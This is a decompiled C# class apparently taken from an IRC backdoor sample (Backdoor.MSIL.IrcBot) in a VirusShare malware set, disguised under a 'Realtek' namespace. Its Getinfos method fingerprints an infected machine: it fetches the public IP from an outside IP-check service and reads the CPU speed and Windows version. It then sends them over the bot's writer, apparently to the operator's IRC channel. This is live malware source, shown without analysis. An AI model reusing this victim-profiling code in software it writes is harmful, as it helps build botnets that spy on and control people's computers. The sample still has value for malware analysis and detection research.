// Decompiled with JetBrains decompiler
// Type: Realtek.CompInfos
// Assembly: Realtek, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D76B5F46-2334-4413-9FB7-17692F948558
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.u-ef0b787b17c95db8b20bb6d9cfcd867d72ab60807c74c3ee2df2c4e0e509958f.exe

using System;
using System.Management;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace Realtek
{
  internal class CompInfos
  {
    private static readonly ManagementObject Mo = new ManagementObject("Win32_Processor.DeviceID='CPU0'");
    private static readonly uint Sp = (uint) CompInfos.Mo["CurrentClockSpeed"];

    internal static void Getinfos()
    {
      WebClient webClient = new WebClient();
      string input = new UTF8Encoding().GetString(webClient.DownloadData("http://checkip.dyndns.org/"));
      webClient.Dispose();
      Match match = new Regex("\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b", RegexOptions.IgnoreCase).Match(input);
      string str = Environment.OSVersion.ToString();
      try
      {
        CompInfos.Mo.Dispose();
        if (str.StartsWith("Microsoft Windows NT 6.0.6000.0"))
        {
          Program.Writer.WriteLine(Program.MessageGreen + str.Replace("Microsoft Windows NT 6.0.6000.0", "Vista Enterprise") + " // " + (object) CompInfos.Sp + " Mhz // " + match.Value);
          Thread.Sleep(2000);
        }
        if (str.StartsWith("Microsoft Windows NT 5.1.2600"))
        {
          Program.Writer.WriteLine(Program.MessageGreen + str.Replace("Microsoft Windows NT 5.1.2600", "Windows XP") + " // " + (object) CompInfos.Sp + " Mhz // " + match.Value);
          Thread.Sleep(2000);
        }
        if (str.StartsWith("Microsoft Windows 4.10.1998"))
        {
          Program.Writer.WriteLine(Program.MessageGreen + str.Replace("Microsoft Windows NT 5.1.2600", "Windows 98") + " // " + (object) CompInfos.Sp + " Mhz // " + match.Value);
          Thread.Sleep(2000);
        }
        if (str.StartsWith("Microsoft Windows 4.10.2222"))
        {
          Program.Writer.WriteLine(Program.MessageGreen + str.Replace("Microsoft Windows 4.10.2222", "Windows 98 SE") + " // " + (object) CompInfos.Sp + " Mhz // " + match.Value);
          Thread.Sleep(2000);
        }
        if (str.StartsWith("Microsoft Windows NT 5.0.2195"))
        {
          Program.Writer.WriteLine(Program.MessageGreen + str.Replace("Microsoft Windows NT 5.0.2195", "Windows 2000") + " // " + (object) CompInfos.Sp + " Mhz // " + match.Value);
          Thread.Sleep(2000);
        }
        if (str.StartsWith("Microsoft Windows 4.90.3000"))
        {
          Program.Writer.WriteLine(Program.MessageGreen + str.Replace("Microsoft Windows 4.90.3000", "Windows Me") + " // " + (object) CompInfos.Sp + " Mhz // " + match.Value);
          Thread.Sleep(2000);
        }
        if (str.StartsWith("Microsoft Windows NT 5.2.3790"))
        {
          Program.Writer.WriteLine(Program.MessageGreen + str.Replace("Microsoft Windows NT 5.2.3790", "Windows XP 64-bit Edition 2003") + " // " + (object) CompInfos.Sp + " Mhz // " + match.Value);
          Thread.Sleep(2000);
        }
        if (str.StartsWith("Microsoft Windows NT 5.2.3790"))
        {
          Program.Writer.WriteLine(Program.MessageGreen + str.Replace("Microsoft Windows NT 5.2.3790", "Windows Server 2003") + " // " + (object) CompInfos.Sp + " Mhz // " + match.Value);
          Thread.Sleep(2000);
        }
        if (str.StartsWith("Microsoft Windows NT 5.2.3790"))
        {
          Program.Writer.WriteLine(Program.MessageGreen + str.Replace("Microsoft Windows NT 5.2.3790", "Windows XP Professional x64 Edition") + " // " + (object) CompInfos.Sp + " Mhz // " + match.Value);
          Thread.Sleep(2000);
        }
        if (str.StartsWith("Microsoft Windows NT 6.0.6001"))
        {
          Program.Writer.WriteLine(Program.MessageGreen + str.Replace("Microsoft Windows NT 6.0.6001", "Windows Vista ") + " // " + (object) CompInfos.Sp + " Mhz // " + match.Value);
          Thread.Sleep(2000);
        }
        if (str.StartsWith("Microsoft Windows NT 5.2.4500"))
        {
          Program.Writer.WriteLine(Program.MessageGreen + str.Replace("Microsoft Windows NT 5.2.4500", "Windows Home Server") + " // " + (object) CompInfos.Sp + " Mhz // " + match.Value);
          Thread.Sleep(2000);
        }
        if (!str.StartsWith("Microsoft Windows NT 6.1.7100"))
          return;
        Program.Writer.WriteLine(Program.MessageGreen + str.Replace("Microsoft Windows NT 6.1.7100", "Windows Seven") + " // " + (object) CompInfos.Sp + " Mhz // " + match.Value);
        Thread.Sleep(2000);
      }
      catch (Exception ex)
      {
        Program.Writer.WriteLine(Program.MessageRed + "error : " + (object) ex);
        Thread.Sleep(2000);
      }
    }
  }
}
